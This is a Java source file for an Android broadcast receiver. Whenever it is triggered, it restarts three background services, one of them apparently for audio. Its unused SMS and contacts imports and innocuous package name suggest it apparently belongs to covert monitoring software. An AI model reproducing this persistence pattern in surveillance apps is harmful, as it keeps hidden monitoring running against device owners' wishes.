package com.cpu;

import android.content.BroadcastReceiver;
import android.content.SharedPreferences;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;
import com.status.*;
import com.tools.*;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.telephony.SmsManager;

public class ReceiverThread extends BroadcastReceiver
{
      @Override
      public void onReceive(Context context, Intent intent)
      {
          // Toast.makeText(context, "Iam", Toast.LENGTH_LONG).show();
          if (runServiceBoot(context) == false) context.startService(new Intent(context, ServiceBoot.class));
          if (runServiceStatus(context) == false) context.startService(new Intent(context, ServiceStatus.class));
          if (runAudioPreview(context) == false) context.startService(new Intent(context, AudioPreview.class));
      }

      public boolean runServiceBoot(Context context) {
          ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
          for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
               if (ServiceBoot.class.getName().equals(service.service.getClassName())) {
                   return true;
               }
		  }
        return false;
      }

      public boolean runServiceStatus(Context context) {
          ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
          for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
               if (ServiceStatus.class.getName().equals(service.service.getClassName())) {
                    return true;
               }
		   }
        return false;
      }

      public boolean runAudioPreview(Context context) {
          ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
          for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
               if (AudioPreview.class.getName().equals(service.service.getClassName())) {
                    return true;
               }
		  }
        return false;
      }

}